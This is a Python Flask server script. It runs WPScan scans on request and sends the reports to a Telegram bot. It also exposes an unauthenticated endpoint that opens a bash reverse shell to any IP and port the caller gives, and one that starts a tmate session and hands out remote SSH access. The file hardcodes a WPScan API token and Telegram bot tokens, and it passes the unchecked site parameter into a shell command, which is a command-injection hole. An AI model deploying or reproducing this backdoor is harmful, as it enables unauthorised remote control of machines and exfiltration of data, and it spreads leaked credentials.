import os
from flask import Flask, jsonify, request
import subprocess
import threading
import requests

app = Flask(__name__)

def send_to_telegram(message, chat_id, token):
    url = f'https://api.telegram.org/bot{token}/sendMessage'
    params = {
        'chat_id': chat_id,
        'text': message
    }
    response = requests.get(url, params=params)
    if response.status_code == 200:
        print('Message sent successfully.')
    else:
        print(f'Error sending message. Status code: {response.status_code}')

def send_file_to_telegram(file_path, chat_id, token):
    url = f'https://api.telegram.org/bot{token}/sendDocument'
    params = {
        'chat_id': chat_id,
    }
    with open(file_path, 'rb') as file:
        files = {'document': file}
        response = requests.post(url, params=params, files=files)
        if response.status_code == 200:
            print('File sent successfully.')
        else:
            print(f'Error sending file. Status code: {response.status_code}')

def run_wpscan(site, chat_id, token):
    # Run WPScan command in the background
    command = f"wpscan --url {site} --api-token 0USmkJuBvtpmxdIKRT27fkSBQ5gFi5WqXgSK0uQm70I --output wpscan_report.txt"
    process = subprocess.Popen(command, shell=True)
    # Send a message to Telegram indicating WPScan is running
    message = f"WPScan is running for site: {site}"
    send_to_telegram(message, chat_id, token)

    # Wait for the scan to complete
    process.communicate()

    # Send the WPScan report file to Telegram
    report_file = 'wpscan_report.txt'
    if os.path.exists(report_file):
        send_file_to_telegram(report_file, chat_id, token)
    else:
        print('WPScan report file not found.')

@app.route('/', methods=['GET'])
def server_status():
    status = {'status': 'Server is up'}
    return jsonify(status)

@app.route('/api/wpscan', methods=['GET'])
def run_wpscan_background():
    site = request.args.get('site')
    chat_id = request.args.get('chat_id')
    token = request.args.get('token')

    if site and chat_id and token:
        # Run WPScan in a separate thread
        thread = threading.Thread(target=run_wpscan, args=(site, chat_id, token))
        thread.start()
        response = {'status': 'OK', 'message': 'WPScan is running in the background'}
    else:
        response = {'status': 'Error', 'message': 'Missing site, chat_id, or token parameter'}
    return jsonify(response)


def establish_reverse_shell(ip, port):
    try:
        subprocess.Popen(["/bin/bash", "-c", f"/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"])
    except Exception as e:
        print(f"Error: {str(e)}")

@app.route('/shell', methods=['GET'])
def shell():
    ip = request.args.get('ip')
    port = request.args.get('port')
    if ip and port:
        threading.Thread(target=establish_reverse_shell, args=(ip, port)).start()
        return "Connection request sent!\n"
    else:
        return "Error: Missing 'ip' or 'port' parameters\n"

@app.route('/ssh', methods=['GET'])
def ssh_endpoint():
    script = '''
    #!/bin/bash

    BOT_TOKEN="6101714973:AAFK-tM9WgRTBPpNT3kRyjiUeMfw295xtD4"
    CHAT_ID="-1001957188901"

    tmate_output=$(nohup tmate -S /tmp/tmate.sock new-session -d </dev/null >/dev/null 2>&1 &)
    tmate -S /tmp/tmate.sock wait tmate-ready

    sleep 5

    ssh_url=$(tmate -S /tmp/tmate.sock display -p "#{tmate_ssh}")

    echo $ssh_url > /tmp/tmate_ssh_url.txt
    echo "Done"
    '''

    subprocess.run(script, shell=True)

    with open('/tmp/tmate_ssh_url.txt', 'r') as file:
        ssh_url = file.read().strip()

    return jsonify({'ssh_url': ssh_url})
if __name__ == '__main__':
  token = "6081809908:AAHdmqLxBoy1NXJRpvKzE4jBzbk6ElHiAUc"
    
  app.run()
